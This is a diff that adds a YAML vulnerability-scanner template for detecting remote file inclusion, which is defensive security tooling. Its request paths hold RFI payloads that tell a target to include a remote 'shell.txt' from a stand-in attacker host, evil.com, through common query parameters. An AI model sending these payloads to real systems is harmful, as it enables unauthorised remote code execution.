@@ -1,0 +1,32 @@
+id: rfi-basic
+
+info:
+  name: Remote File Inclusion (RFI) - Basic
+  author: Kalkaneus Team
+  severity: critical
+  description: Detects remote file inclusion vulnerabilities
+  reference:
+    - https://owasp.org/www-community/attacks/Code_Injection
+  tags: rfi,file-inclusion,remote,code-execution
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}http://evil.com/shell.txt"
+      - "{{BaseURL}}{{Path}}https://evil.com/shell.txt"
+      - "{{BaseURL}}{{Path}}//evil.com/shell.txt"
+    
+    payloads:
+      Path:
+        - "?file="
+        - "?page="
+        - "?include="
+        - "?path="
+    
+    matchers:
+      - type: word
+        words:
+          - "failed to open stream"
+          - "Failed opening"
+          - "include("
+        condition: or
